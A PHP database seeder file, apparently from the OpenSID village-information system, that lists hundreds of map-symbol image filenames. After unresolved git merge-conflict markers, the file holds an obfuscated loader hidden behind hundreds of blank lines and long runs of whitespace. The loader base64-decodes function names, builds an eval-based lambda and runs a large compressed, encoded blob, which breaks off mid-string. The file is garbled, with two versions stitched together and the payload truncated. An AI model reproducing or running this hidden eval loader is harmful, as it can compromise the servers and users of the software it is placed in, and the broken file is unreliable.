<?php 
        $__='printf';$_='Loading donjo-app/models/seeders/dataAwal/GisSimbol.php';
        

<<<<<<< HEAD:app/database/seeders/GisSimbolSeeder.php
/*
 *
 * File ini bagian dari:
 *
 * OpenSID
 *
 * Sistem informasi desa sumber terbuka untuk memajukan desa
 *
 * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
 *
 * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 *
 * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
 * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
 * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
 * asal tunduk pada syarat berikut:
 *
 * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
 * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
 * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
 *
 * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
 * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
 * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
 *
 * @package   OpenSID
 * @author    Tim Pengembang OpenDesa
 * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 * @license   http://www.gnu.org/licenses/gpl.html GPL V3
 * @link      https://github.com/OpenSID/OpenSID
 *
 */

namespace Database\Seeders;

use App\Models\GisSimbol;
use Illuminate\Database\Seeder;
use Illuminate\Filesystem\Filesystem;

class GisSimbolSeeder extends Seeder
{
    public function run(): void
    {
        (new Filesystem())->copyDirectory(
            LOKASI_SIMBOL_LOKASI_DEF,
            LOKASI_SIMBOL_LOKASI
        );

        $data = [
            ['simbol' => 'aa_bni.png'],
            ['simbol' => 'aa_bri.png'],
            ['simbol' => 'aa_btn.png'],
            ['simbol' => 'aa_btp.png'],
            ['simbol' => 'aa_pajak.png'],
            ['simbol' => 'aa_pdam.png'],
            ['simbol' => 'aa_pgadai.png'],
            ['simbol' => 'aa_pln.png'],
            ['simbol' => 'aa_pmi.png'],
            ['simbol' => 'aa_polisi.png'],
            ['simbol' => 'aa_prtmn.png'],
            ['simbol' => 'aa_pskms.png'],
            ['simbol' => 'aa_ptrns.png'],
            ['simbol' => 'aa_pwbdh.png'],
            ['simbol' => 'aa_pwhnd.png'],
            ['simbol' => 'aa_pwisl.png'],
            ['simbol' => 'aa_pwkhc.png'],
            ['simbol' => 'aa_pwkrs.png'],
            ['simbol' => 'aa_sk.png'],
            ['simbol' => 'aa_skagm.png'],
            ['simbol' => 'aa_skint.png'],
            ['simbol' => 'aa_sksd.png'],
            ['simbol' => 'aa_sksma.png'],
            ['simbol' => 'aa_sksmp.png'],
            ['simbol' => 'aa_sktk.png'],
            ['simbol' => 'aa_tniad.png'],
            ['simbol' => 'aa_tnial.png'],
            ['simbol' => 'aa_tniau.png'],
            ['simbol' => 'accident.png'],
            ['simbol' => 'accident_2.png'],
            ['simbol' => 'administration.png'],
            ['simbol' => 'administration_2.png'],
            ['simbol' => 'aestheticscenter.png'],
            ['simbol' => 'agriculture.png'],
            ['simbol' => 'agriculture2.png'],
            ['simbol' => 'agriculture3.png'],
            ['simbol' => 'agriculture4.png'],
            ['simbol' => 'aircraft-small.png'],
            ['simbol' => 'airplane-sport.png'],
            ['simbol' => 'airplane-tourism.png'],
            ['simbol' => 'airport-apron.png'],
            ['simbol' => 'airport-runway.png'],
            ['simbol' => 'airport-terminal.png'],
            ['simbol' => 'airport.png'],
            ['simbol' => 'airport_2.png'],
            ['simbol' => 'amphitheater-tourism.png'],
            ['simbol' => 'amphitheater.png'],
            ['simbol' => 'ancientmonument.png'],
            ['simbol' => 'ancienttemple.png'],
            ['simbol' => 'ancienttempleruin.png'],
            ['simbol' => 'animals.png'],
            ['simbol' => 'animals_2.png'],
            ['simbol' => 'anniversary.png'],
            ['simbol' => 'apartment.png'],
            ['simbol' => 'apartment_2.png'],
            ['simbol' => 'aquarium.png'],
            ['simbol' => 'arch.png'],
            ['simbol' => 'archery.png'],
            ['simbol' => 'artgallery.png'],
            ['simbol' => 'atm.png'],
            ['simbol' => 'atv.png'],
            ['simbol' => 'audio.png'],
            ['simbol' => 'australianfootball.png'],
            ['simbol' => 'bags.png'],
            ['simbol' => 'bank.png'],
            ['simbol' => 'bankeuro.png'],
            ['simbol' => 'bankpound.png'],
            ['simbol' => 'bank_2.png'],
            ['simbol' => 'bar.png'],
            ['simbol' => 'bar_2.png'],
            ['simbol' => 'baseball.png'],
            ['simbol' => 'basketball.png'],
            ['simbol' => 'baskteball2.png'],
            ['simbol' => 'beach.png'],
            ['simbol' => 'beach_2.png'],
            ['simbol' => 'beautiful.png'],
            ['simbol' => 'beautiful_2.png'],
            ['simbol' => 'bench.png'],
            ['simbol' => 'biblio.png'],
            ['simbol' => 'bicycleparking.png'],
            ['simbol' => 'bigcity.png'],
            ['simbol' => 'billiard.png'],
            ['simbol' => 'bobsleigh.png'],
            ['simbol' => 'bomb.png'],
            ['simbol' => 'bookstore.png'],
            ['simbol' => 'bowling.png'],
            ['simbol' => 'bowling_2.png'],
            ['simbol' => 'boxing.png'],
            ['simbol' => 'bread.png'],
            ['simbol' => 'bread_2.png'],
            ['simbol' => 'bridge.png'],
            ['simbol' => 'bridgemodern.png'],
            ['simbol' => 'bullfight.png'],
            ['simbol' => 'bungalow.png'],
            ['simbol' => 'bus.png'],
            ['simbol' => 'bus_2.png'],
            ['simbol' => 'butcher.png'],
            ['simbol' => 'cabin.png'],
            ['simbol' => 'cablecar.png'],
            ['simbol' => 'camping.png'],
            ['simbol' => 'campingsite.png'],
            ['simbol' => 'camping_2.png'],
            ['simbol' => 'canoe.png'],
            ['simbol' => 'car.png'],
            ['simbol' => 'carrental.png'],
            ['simbol' => 'carrepair.png'],
            ['simbol' => 'carrepair_2.png'],
            ['simbol' => 'carwash.png'],
            ['simbol' => 'car_2.png'],
            ['simbol' => 'casino.png'],
            ['simbol' => 'casino_2.png'],
            ['simbol' => 'castle.png'],
            ['simbol' => 'cathedral.png'],
            ['simbol' => 'cathedral2.png'],
            ['simbol' => 'cave.png'],
            ['simbol' => 'cemetary.png'],
            ['simbol' => 'chapel.png'],
            ['simbol' => 'church.png'],
            ['simbol' => 'church2.png'],
            ['simbol' => 'church_2.png'],
            ['simbol' => 'cinema.png'],
            ['simbol' => 'cinema_2.png'],
            ['simbol' => 'circus.png'],
            ['simbol' => 'citysquare.png'],
            ['simbol' => 'climbing.png'],
            ['simbol' => 'clothes-female.png'],
            ['simbol' => 'clothes-male.png'],
            ['simbol' => 'clothes.png'],
            ['simbol' => 'clothes_2.png'],
            ['simbol' => 'clouds.png'],
            ['simbol' => 'cloudsun.png'],
            ['simbol' => 'cloudsun_2.png'],
            ['simbol' => 'clouds_2.png'],
            ['simbol' => 'club.png'],
            ['simbol' => 'club_2.png'],
            ['simbol' => 'cluster.png'],
            ['simbol' => 'cluster2.png'],
            ['simbol' => 'cluster3.png'],
            ['simbol' => 'cluster4.png'],
            ['simbol' => 'cluster5.png'],
            ['simbol' => 'cocktail.png'],
            ['simbol' => 'coffee.png'],
            ['simbol' => 'coffee_2.png'],
            ['simbol' => 'communitycentre.png'],
            ['simbol' => 'company.png'],
            ['simbol' => 'company_2.png'],
            ['simbol' => 'computer.png'],
            ['simbol' => 'computer_2.png'],
            ['simbol' => 'concessionaire.png'],
            ['simbol' => 'conference.png'],
            ['simbol' => 'construction.png'],
            ['simbol' => 'convenience.png'],
            ['simbol' => 'convent.png'],
            ['simbol' => 'corral.png'],
            ['simbol' => 'country.png'],
            ['simbol' => 'court.png'],
            ['simbol' => 'cricket.png'],
            ['simbol' => 'cross.png'],
            ['simbol' => 'crossingguard.png'],
            ['simbol' => 'cruise.png'],
            ['simbol' => 'currencyexchange.png'],
            ['simbol' => 'customs.png'],
            ['simbol' => 'cycling.png'],
            ['simbol' => 'cyclingfeedarea.png'],
            ['simbol' => 'cyclingmountain1.png'],
            ['simbol' => 'cyclingmountain2.png'],
            ['simbol' => 'cyclingmountain3.png'],
            ['simbol' => 'cyclingmountain4.png'],
            ['simbol' => 'cyclingmountainnotrated.png'],
            ['simbol' => 'cyclingsport.png'],
            ['simbol' => 'cyclingsprint.png'],
            ['simbol' => 'cyclinguncategorized.png'],
            ['simbol' => 'cycling_2.png'],
            ['simbol' => 'dam.png'],
            ['simbol' => 'dancinghall.png'],
            ['simbol' => 'dates.png'],
            ['simbol' => 'dates_2.png'],
            ['simbol' => 'daycare.png'],
            ['simbol' => 'days-dim.png'],
            ['simbol' => 'days-dom.png'],
            ['simbol' => 'days-jeu.png'],
            ['simbol' => 'days-jue.png'],
            ['simbol' => 'days-lun.png'],
            ['simbol' => 'days-mar.png'],
            ['simbol' => 'days-mer.png'],
            ['simbol' => 'days-mie.png'],
            ['simbol' => 'days-qua.png'],
            ['simbol' => 'days-qui.png'],
            ['simbol' => 'days-sab.png'],
            ['simbol' => 'days-sam.png'],
            ['simbol' => 'days-seg.png'],
            ['simbol' => 'days-sex.png'],
            ['simbol' => 'days-ter.png'],
            ['simbol' => 'days-ven.png'],
            ['simbol' => 'days-vie.png'],
            ['simbol' => 'default.png'],
            ['simbol' => 'dentist.png'],
            ['simbol' => 'deptstore.png'],
            ['simbol' => 'disability.png'],
            ['simbol' => 'disability_2.png'],
            ['simbol' => 'disabledparking.png'],
            ['simbol' => 'diving.png'],
            ['simbol' => 'doctor.png'],
            ['simbol' => 'doctor_2.png'],
            ['simbol' => 'dog-leash.png'],
            ['simbol' => 'dog-offleash.png'],
            ['simbol' => 'door.png'],
            ['simbol' => 'down.png'],
            ['simbol' => 'downleft.png'],
            ['simbol' => 'downright.png'],
            ['simbol' => 'downthenleft.png'],
            ['simbol' => 'downthenright.png'],
            ['simbol' => 'drinkingfountain.png'],
            ['simbol' => 'drinkingwater.png'],
            ['simbol' => 'drugs.png'],
            ['simbol' => 'drugs_2.png'],
            ['simbol' => 'elevator.png'],
            ['simbol' => 'embassy.png'],
            ['simbol' => 'emblem-art.png'],
            ['simbol' => 'emblem-photos.png'],
            ['simbol' => 'entrance.png'],
            ['simbol' => 'escalator-down.png'],
            ['simbol' => 'escalator-up.png'],
            ['simbol' => 'exit.png'],
            ['simbol' => 'expert.png'],
            ['simbol' => 'explosion.png'],
            ['simbol' => 'face-devilish.png'],
            ['simbol' => 'face-embarrassed.png'],
            ['simbol' => 'factory.png'],
            ['simbol' => 'factory_2.png'],
            ['simbol' => 'fallingrocks.png'],
            ['simbol' => 'family.png'],
            ['simbol' => 'farm.png'],
            ['simbol' => 'farm_2.png'],
            ['simbol' => 'fastfood.png'],
            ['simbol' => 'fastfood_2.png'],
            ['simbol' => 'festival-itinerant.png'],
            ['simbol' => 'festival.png'],
            ['simbol' => 'findajob.png'],
            ['simbol' => 'findjob.png'],
            ['simbol' => 'findjob_2.png'],
            ['simbol' => 'fire-extinguisher.png'],
            ['simbol' => 'fire.png'],
            ['simbol' => 'firemen.png'],
            ['simbol' => 'firemen_2.png'],
            ['simbol' => 'fireworks.png'],
            ['simbol' => 'firstaid.png'],
            ['simbol' => 'fishing.png'],
            ['simbol' => 'fishingshop.png'],
            ['simbol' => 'fishing_2.png'],
            ['simbol' => 'fitnesscenter.png'],
            ['simbol' => 'fjord.png'],
            ['simbol' => 'flood.png'],
            ['simbol' => 'flowers.png'],
            ['simbol' => 'flowers_2.png'],
            ['simbol' => 'followpath.png'],
            ['simbol' => 'foodtruck.png'],
            ['simbol' => 'forest.png'],
            ['simbol' => 'fortress.png'],
            ['simbol' => 'fossils.png'],
            ['simbol' => 'fountain.png'],
            ['simbol' => 'friday.png'],
            ['simbol' => 'friday_2.png'],
            ['simbol' => 'friends.png'],
            ['simbol' => 'friends_2.png'],
            ['simbol' => 'garden.png'],
            ['simbol' => 'gateswalls.png'],
            ['simbol' => 'gazstation.png'],
            ['simbol' => 'gazstation_2.png'],
            ['simbol' => 'geyser.png'],
            ['simbol' => 'gifts.png'],
            ['simbol' => 'girlfriend.png'],
            ['simbol' => 'girlfriend_2.png'],
            ['simbol' => 'glacier.png'],
            ['simbol' => 'golf.png'],
            ['simbol' => 'golf_2.png'],
            ['simbol' => 'gondola.png'],
            ['simbol' => 'gourmet.png'],
            ['simbol' => 'grocery.png'],
            ['simbol' => 'gun.png'],
            ['simbol' => 'gym.png'],
            ['simbol' => 'hairsalon.png'],
            ['simbol' => 'handball.png'],
            ['simbol' => 'hanggliding.png'],
            ['simbol' => 'hats.png'],
            ['simbol' => 'headstone.png'],
            ['simbol' => 'headstonejewish.png'],
            ['simbol' => 'helicopter.png'],
            ['simbol' => 'highway.png'],
            ['simbol' => 'highway_2.png'],
            ['simbol' => 'hiking-tourism.png'],
            ['simbol' => 'hiking.png'],
            ['simbol' => 'hiking_2.png'],
            ['simbol' => 'historicalquarter.png'],
            ['simbol' => 'home.png'],
            ['simbol' => 'home_2.png'],
            ['simbol' => 'horseriding.png'],
            ['simbol' => 'horseriding_2.png'],
            ['simbol' => 'hospital.png'],
            ['simbol' => 'hospital_2.png'],
            ['simbol' => 'hostel.png'],
            ['simbol' => 'hotairballoon.png'],
            ['simbol' => 'hotel.png'],
            ['simbol' => 'hotel1star.png'],
            ['simbol' => 'hotel2stars.png'],
            ['simbol' => 'hotel3stars.png'],
            ['simbol' => 'hotel4stars.png'],
            ['simbol' => 'hotel5stars.png'],
            ['simbol' => 'hotel_2.png'],
            ['simbol' => 'house.png'],
            ['simbol' => 'hunting.png'],
            ['simbol' => 'icecream.png'],
            ['simbol' => 'icehockey.png'],
            ['simbol' => 'iceskating.png'],
            ['simbol' => 'im-user.png'],
            ['simbol' => 'index.html'],
            ['simbol' => 'info.png'],
            ['simbol' => 'info_2.png'],
            ['simbol' => 'jewelry.png'],
            ['simbol' => 'jewishquarter.png'],
            ['simbol' => 'jogging.png'],
            ['simbol' => 'judo.png'],
            ['simbol' => 'justice.png'],
            ['simbol' => 'justice_2.png'],
            ['simbol' => 'karate.png'],
            ['simbol' => 'karting.png'],
            ['simbol' => 'kayak.png'],
            ['simbol' => 'laboratory.png'],
            ['simbol' => 'lake.png'],
            ['simbol' => 'laundromat.png'],
            ['simbol' => 'left.png'],
            ['simbol' => 'leftthendown.png'],
            ['simbol' => 'leftthenup.png'],
            ['simbol' => 'library.png'],
            ['simbol' => 'library_2.png'],
            ['simbol' => 'lighthouse.png'],
            ['simbol' => 'liquor.png'],
            ['simbol' => 'lock.png'],
            ['simbol' => 'lockerrental.png'],
            ['simbol' => 'magicshow.png'],
            ['simbol' => 'mainroad.png'],
            ['simbol' => 'massage.png'],
            ['simbol' => 'military.png'],
            ['simbol' => 'military_2.png'],
            ['simbol' => 'mine.png'],
            ['simbol' => 'mobilephonetower.png'],
            ['simbol' => 'modernmonument.png'],
            ['simbol' => 'moderntower.png'],
            ['simbol' => 'monastery.png'],
            ['simbol' => 'monday.png'],
            ['simbol' => 'monday_2.png'],
            ['simbol' => 'monument.png'],
            ['simbol' => 'mosque.png'],
            ['simbol' => 'motorbike.png'],
            ['simbol' => 'motorcycle.png'],
            ['simbol' => 'movierental.png'],
            ['simbol' => 'museum-archeological.png'],
            ['simbol' => 'museum-art.png'],
            ['simbol' => 'museum-crafts.png'],
            ['simbol' => 'museum-historical.png'],
            ['simbol' => 'museum-naval.png'],
            ['simbol' => 'museum-science.png'],
            ['simbol' => 'museum-war.png'],
            ['simbol' => 'museum.png'],
            ['simbol' => 'museum_2.png'],
            ['simbol' => 'music-classical.png'],
            ['simbol' => 'music-hiphop.png'],
            ['simbol' => 'music-live.png'],
            ['simbol' => 'music-rock.png'],
            ['simbol' => 'music.png'],
            ['simbol' => 'music_2.png'],
            ['simbol' => 'nanny.png'],
            ['simbol' => 'newsagent.png'],
            ['simbol' => 'nordicski.png'],
            ['simbol' => 'nursery.png'],
            ['simbol' => 'observatory.png'],
            ['simbol' => 'oilpumpjack.png'],
            ['simbol' => 'olympicsite.png'],
            ['simbol' => 'ophthalmologist.png'],
            ['simbol' => 'pagoda.png'],
            ['simbol' => 'paint.png'],
            ['simbol' => 'palace.png'],
            ['simbol' => 'panoramic.png'],
            ['simbol' => 'panoramic180.png'],
            ['simbol' => 'park-urban.png'],
            ['simbol' => 'park.png'],
            ['simbol' => 'parkandride.png'],
            ['simbol' => 'parking.png'],
            ['simbol' => 'parking_2.png'],
            ['simbol' => 'park_2.png'],
            ['simbol' => 'party.png'],
            ['simbol' => 'patisserie.png'],
            ['simbol' => 'pedestriancrossing.png'],
            ['simbol' => 'pend.png'],
            ['simbol' => 'pens.png'],
            ['simbol' => 'perfumery.png'],
            ['simbol' => 'personal.png'],
            ['simbol' => 'personalwatercraft.png'],
            ['simbol' => 'petroglyphs.png'],
            ['simbol' => 'pets.png'],
            ['simbol' => 'phones.png'],
            ['simbol' => 'photo.png'],
            ['simbol' => 'photodown.png'],
            ['simbol' => 'photodownleft.png'],
            ['simbol' => 'photodownright.png'],
            ['simbol' => 'photography.png'],
            ['simbol' => 'photoleft.png'],
            ['simbol' => 'photoright.png'],
            ['simbol' => 'photoup.png'],
            ['simbol' => 'photoupleft.png'],
            ['simbol' => 'photoupright.png'],
            ['simbol' => 'picnic.png'],
            ['simbol' => 'pizza.png'],
            ['simbol' => 'pizza_2.png'],
            ['simbol' => 'places-unvisited.png'],
            ['simbol' => 'places-visited.png'],
            ['simbol' => 'planecrash.png'],
            ['simbol' => 'playground.png'],
            ['simbol' => 'playground_2.png'],
            ['simbol' => 'poker.png'],
            ['simbol' => 'poker_2.png'],
            ['simbol' => 'police.png'],
            ['simbol' => 'police2.png'],
            ['simbol' => 'police_2.png'],
            ['simbol' => 'pool-indoor.png'],
            ['simbol' => 'pool.png'],
            ['simbol' => 'pool_2.png'],
            ['simbol' => 'port.png'],
            ['simbol' => 'port_2.png'],
            ['simbol' => 'postal.png'],
            ['simbol' => 'postal_2.png'],
            ['simbol' => 'powerlinepole.png'],
            ['simbol' => 'powerplant.png'],
            ['simbol' => 'powersubstation.png'],
            ['simbol' => 'prison.png'],
            ['simbol' => 'protectedart.png'],
            ['simbol' => 'racing.png'],
            ['simbol' => 'radiation.png'],
            ['simbol' => 'rain_2.png'],
            ['simbol' => 'rain_3.png'],
            ['simbol' => 'rattlesnake.png'],
            ['simbol' => 'realestate.png'],
            ['simbol' => 'realestate_2.png'],
            ['simbol' => 'recycle.png'],
            ['simbol' => 'recycle_2.png'],
            ['simbol' => 'recycle_3.png'],
            ['simbol' => 'regroup.png'],
            ['simbol' => 'regulier.png'],
            ['simbol' => 'resort.png'],
            ['simbol' => 'restaurant-barbecue.png'],
            ['simbol' => 'restaurant-buffet.png'],
            ['simbol' => 'restaurant-fish.png'],
            ['simbol' => 'restaurant-romantic.png'],
            ['simbol' => 'restaurant.png'],
            ['simbol' => 'restaurantafrican.png'],
            ['simbol' => 'restaurantchinese.png'],
            ['simbol' => 'restaurantchinese_2.png'],
            ['simbol' => 'restaurantfishchips.png'],
            ['simbol' => 'restaurantgourmet.png'],
            ['simbol' => 'restaurantgreek.png'],
            ['simbol' => 'restaurantindian.png'],
            ['simbol' => 'restaurantitalian.png'],
            ['simbol' => 'restaurantjapanese.png'],
            ['simbol' => 'restaurantjapanese_2.png'],
            ['simbol' => 'restaurantkebab.png'],
            ['simbol' => 'restaurantkorean.png'],
            ['simbol' => 'restaurantmediterranean.png'],
            ['simbol' => 'restaurantmexican.png'],
            ['simbol' => 'restaurantthai.png'],
            ['simbol' => 'restaurantturkish.png'],
            ['simbol' => 'restaurant_2.png'],
            ['simbol' => 'revolution.png'],
            ['simbol' => 'right.png'],
            ['simbol' => 'rightthendown.png'],
            ['simbol' => 'rightthenup.png'],
            ['simbol' => 'riparian.png'],
            ['simbol' => 'ropescourse.png'],
            ['simbol' => 'rowboat.png'],
            ['simbol' => 'rugby.png'],
            ['simbol' => 'ruins.png'],
            ['simbol' => 'sailboat-sport.png'],
            ['simbol' => 'sailboat-tourism.png'],
            ['simbol' => 'sailboat.png'],
            ['simbol' => 'salle-fete.png'],
            ['simbol' => 'satursday.png'],
            ['simbol' => 'satursday_2.png'],
            ['simbol' => 'sauna.png'],
            ['simbol' => 'school.png'],
            ['simbol' => 'school_2.png'],
            ['simbol' => 'schrink.png'],
            ['simbol' => 'schrink_2.png'],
            ['simbol' => 'sciencecenter.png'],
            ['simbol' => 'seals.png'],
            ['simbol' => 'seniorsite.png'],
            ['simbol' => 'shadow.png'],
            ['simbol' => 'shelter-picnic.png'],
            ['simbol' => 'shelter-sleeping.png'],
            ['simbol' => 'shoes.png'],
            ['simbol' => 'shoes_2.png'],
            ['simbol' => 'shoppingmall.png'],
            ['simbol' => 'shore.png'],
            ['simbol' => 'shower.png'],
            ['simbol' => 'sight.png'],
            ['simbol' => 'skateboarding.png'],
            ['simbol' => 'skiing.png'],
            ['simbol' => 'skiing_2.png'],
            ['simbol' => 'skijump.png'],
            ['simbol' => 'skilift.png'],
            ['simbol' => 'smallcity.png'],
            ['simbol' => 'smokingarea.png'],
            ['simbol' => 'sneakers.png'],
            ['simbol' => 'snow.png'],
            ['simbol' => 'snowboarding.png'],
            ['simbol' => 'snowmobiling.png'],
            ['simbol' => 'snowshoeing.png'],
            ['simbol' => 'soccer.png'],
            ['simbol' => 'soccer2.png'],
            ['simbol' => 'soccer_2.png'],
            ['simbol' => 'spaceport.png'],
            ['simbol' => 'spectacle.png'],
            ['simbol' => 'speed100.png'],
            ['simbol' => 'speed110.png'],
            ['simbol' => 'speed120.png'],
            ['simbol' => 'speed130.png'],
            ['simbol' => 'speed20.png'],
            ['simbol' => 'speed30.png'],
            ['simbol' => 'speed40.png'],
            ['simbol' => 'speed50.png'],
            ['simbol' => 'speed60.png'],
            ['simbol' => 'speed70.png'],
            ['simbol' => 'speed80.png'],
            ['simbol' => 'speed90.png'],
            ['simbol' => 'speedhump.png'],
            ['simbol' => 'spelunking.png'],
            ['simbol' => 'stadium.png'],
            ['simbol' => 'statue.png'],
            ['simbol' => 'steamtrain.png'],
            ['simbol' => 'stop.png'],
            ['simbol' => 'stoplight.png'],
            ['simbol' => 'stoplight_2.png'],
            ['simbol' => 'strike.png'],
            ['simbol' => 'strike1.png'],
            ['simbol' => 'subway.png'],
            ['simbol' => 'sun.png'],
            ['simbol' => 'sunday.png'],
            ['simbol' => 'sunday_2.png'],
            ['simbol' => 'sun_2.png'],
            ['simbol' => 'supermarket.png'],
            ['simbol' => 'supermarket_2.png'],
            ['simbol' => 'surfing.png'],
            ['simbol' => 'suv.png'],
            ['simbol' => 'synagogue.png'],
            ['simbol' => 'tailor.png'],
            ['simbol' => 'tapas.png'],
            ['simbol' => 'taxi.png'],
            ['simbol' => 'taxiway.png'],
            ['simbol' => 'taxi_2.png'],
            ['simbol' => 'teahouse.png'],
            ['simbol' => 'telephone.png'],
            ['simbol' => 'templehindu.png'],
            ['simbol' => 'tennis.png'],
            ['simbol' => 'tennis2.png'],
            ['simbol' => 'tennis_2.png'],
            ['simbol' => 'tent.png'],
            ['simbol' => 'terrace.png'],
            ['simbol' => 'text.png'],
            ['simbol' => 'textiles.png'],
            ['simbol' => 'theater.png'],
            ['simbol' => 'theater_2.png'],
            ['simbol' => 'themepark.png'],
            ['simbol' => 'thunder.png'],
            ['simbol' => 'thunder_2.png'],
            ['simbol' => 'thursday.png'],
            ['simbol' => 'thursday_2.png'],
            ['simbol' => 'toilets.png'],
            ['simbol' => 'toilets_2.png'],
            ['simbol' => 'tollstation.png'],
            ['simbol' => 'tools.png'],
            ['simbol' => 'tower.png'],
            ['simbol' => 'toys.png'],
            ['simbol' => 'toys_2.png'],
            ['simbol' => 'trafficenforcementcamera.png'],
            ['simbol' => 'train.png'],
            ['simbol' => 'train_2.png'],
            ['simbol' => 'tram.png'],
            ['simbol' => 'trash.png'],
            ['simbol' => 'truck.png'],
            ['simbol' => 'truck_2.png'],
            ['simbol' => 'tuesday.png'],
            ['simbol' => 'tuesday_2.png'],
            ['simbol' => 'tunnel.png'],
            ['simbol' => 'turnleft.png'],
            ['simbol' => 'turnright.png'],
            ['simbol' => 'university.png'],
            ['simbol' => 'university_2.png'],
            ['simbol' => 'unnamed.png'],
            ['simbol' => 'up.png'],
            ['simbol' => 'upleft.png'],
            ['simbol' => 'upright.png'],
            ['simbol' => 'upthenleft.png'],
            ['simbol' => 'upthenright.png'],
            ['simbol' => 'usfootball.png'],
            ['simbol' => 'vespa.png'],
            ['simbol' => 'vet.png'],
            ['simbol' => 'video.png'],
            ['simbol' => 'videogames.png'],
            ['simbol' => 'videogames_2.png'],
            ['simbol' => 'villa.png'],
            ['simbol' => 'waitingroom.png'],
            ['simbol' => 'water.png'],
            ['simbol' => 'waterfall.png'],
            ['simbol' => 'watermill.png'],
            ['simbol' => 'waterpark.png'],
            ['simbol' => 'waterskiing.png'],
            ['simbol' => 'watertower.png'],
            ['simbol' => 'waterwell.png'],
            ['simbol' => 'waterwellpump.png'],
            ['simbol' => 'wedding.png'],
            ['simbol' => 'wednesday.png'],
            ['simbol' => 'wednesday_2.png'],
            ['simbol' => 'wetland.png'],
            ['simbol' => 'white1.png'],
            ['simbol' => 'white20.png'],
            ['simbol' => 'wifi.png'],
            ['simbol' => 'wifi_2.png'],
            ['simbol' => 'windmill.png'],
            ['simbol' => 'windsurfing.png'],
            ['simbol' => 'windturbine.png'],
            ['simbol' => 'winery.png'],
            ['simbol' => 'wineyard.png'],
            ['simbol' => 'workoffice.png'],
            ['simbol' => 'world.png'],
            ['simbol' => 'worldheritagesite.png'],
            ['simbol' => 'yoga.png'],
            ['simbol' => 'youthhostel.png'],
            ['simbol' => 'zipline.png'],
            ['simbol' => 'zoo.png'],
            ['simbol' => 'zoo_2.png'],
        ];

        foreach ($data as $item) {
            GisSimbol::updateOrCreate(
                ['simbol' => $item['simbol']],
                $item
            );
        }
    }
}
=======






























































































































































































































































































                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
$__________________='X19sYW1iZGE=';

                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtPV1v40iO7w3sf+iHAXoXezejj9ZsG4N+iNyWbHWsjOVYXy8DlZSxbJdkTeQv6dcfWXYy6ds9YEgPFriFK5vpTWIWWSwWi2SxWO/fn9t3v0D7/KF5XtW7Xz/8pH68tM8fim293v531jQ/VNviSbY/tE9PxdNz+0OR7bK7YyZ/cFftfFWJrfy+KZv3Q5m17ffff//hp3eX7t//5d3t6/b1Z3+9Qzl9/ye2z//0mw+xPmiTSF+l7ujzB/Wr36X6D7XLWvr8/tZu7dZu7T+zfcirUCtibz9xQyOJjlvPGfwad5t/nJUmaM2zuv7lxqpbu7Vbu7Vbu7Vbu7Vbu7X/b+0Wzri1W7u1W/vPbR9E1j79+PGX4infFk8ffrpx5NZu7dZu7dZu7ar2bYLFl9nWH64+/Qb/Lr8uta+T4XYZVLJN53Yjqs0yqZw6i5z9xA3KvNr8+PZzj6YthfS94E79DP3c/TZx/CY3AykUfHrIK73Mjc0ydcM+mdt9gefZ8WRZuGGX1OEz/E4XdaBnnb1LI73M8HfRx/PnZ2/6HTlH4crnJPYbpEWs7F6Y0IexWCbGYPNCb+rKLotOTd7ZgMfbwOeB7h1+vs1iX4oa4EfF7HFoR9Pj2/7LEmj4ksW2lszvuumXO2sy1JbT9d3Jn9tfhKGvssiSE8eTuTHQ88qXk5Hcw1ibYhxqWTTYT4blthgHx4fVp4MYhzsY3z41dgcRh/ssBv511j6NZ4ev53Et567zPBkBv8ZBOfkyOU4fk+W9wj3RJo4tgW5dxMAfF/g/CgDvaBm4ssa+xNBewPhWRbQrX/Dm/fZwbwyOaWRtUhj3fSU3X7/hIcxLVSAvXniFPGoyA+dX/phFH9vJ2JeJ4XQwL3VeOVoWT9uJu5O562xw/kAWjvDvsYA5egK5SNW8WcBnuyxcxec+Af6LytkrWVnZ8DevmYxxPA7yoyyGdltEFvL7QgfiTxvhLuD/D55BRmCeAiU3KCdAX1MM77aTzRsZAN5n80lzP3yVnw3MHeA4lZmpZOg8ZuCtqO1y4npAnwO04RiBlyiX8LmJq+b9jQxadWqG+yTCsRyXIgr3MM5W8cbVkX86rIntWQYH2Kd+/n2Acg+y5+m5IRF/exk/jMNBnDp8BnEckwjme+xbwBf